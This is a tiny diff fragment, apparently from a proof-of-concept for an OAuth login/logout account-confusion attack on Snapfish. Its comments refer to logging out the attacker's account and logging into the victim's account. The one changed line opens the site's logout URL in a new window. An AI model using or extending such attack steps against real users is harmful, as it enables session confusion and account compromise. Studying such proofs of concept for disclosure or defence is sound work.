@@ -1,5 +1,5 @@
 //Logout Attacker's Account
-const handle = window.open("https://www.snapfish.com/logout","");
+const handle = window.open("https://www.snapfish.com/logout","_blank");
 alert("LOGOUT");
 
 //Login to Victim's Account using oAuth Login
